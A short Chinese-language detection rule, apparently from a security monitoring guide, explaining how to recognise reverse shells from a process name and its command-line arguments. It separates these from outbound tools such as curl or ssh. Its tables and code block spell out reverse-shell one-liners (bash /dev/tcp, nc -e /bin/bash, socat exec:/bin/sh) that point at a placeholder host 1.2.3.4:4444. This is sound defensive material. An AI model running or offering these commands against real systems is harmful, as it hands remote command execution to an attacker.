# RS-03 · 进程本身是 shell / 解释器

## 进程本身是 shell / 解释器

**这是最直接的一条**：反弹 Shell 的定义里就有「Shell」。

| 进程 | 典型命令行 | 能做什么 |
| --- | --- | --- |
| `bash` | `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1` | 完整交互 shell |
| `sh` / `dash` | `sh -i` | 同上 |
| `nc` / `ncat` | `nc -e /bin/bash 1.2.3.4 4444` | 把 shell 绑到连接上 |
| `python` | `python -c 'import socket,subprocess,os;...'` | 同上（脚本化） |
| `perl` / `ruby` / `php` | 一行脚本 | 同上 |
| `socat` | `socat exec:/bin/sh tcp:1.2.3.4:4444` | 同上 |

### 不在这份名单里的

`curl` / `wget` / `scp` / `rsync` / `ssh` / `mysql` ——
这些**也往外连**，但它们不是「把命令执行能力交给对面」。

**它们可能是数据外传（T1041），但不是反弹 Shell。**

> ⚠️ 但 `ssh` 要单独看：`ssh -R` 反向端口转发**可以**把内网服务暴露出去，
> 那是另一类风险，不是这一类。

### 「命令行里有什么」比「进程名是什么」更硬

同一个 `nc`：

```text
nc -lvvp 4444                    ← 监听，不是反弹
nc -e /bin/bash 1.2.3.4 4444     ← 反弹，带 -e
nc 1.2.3.4 4444                  ← 只是连过去，没有 -e，要交互才知道
```

**判据要看命令行参数**，不能只看进程名。
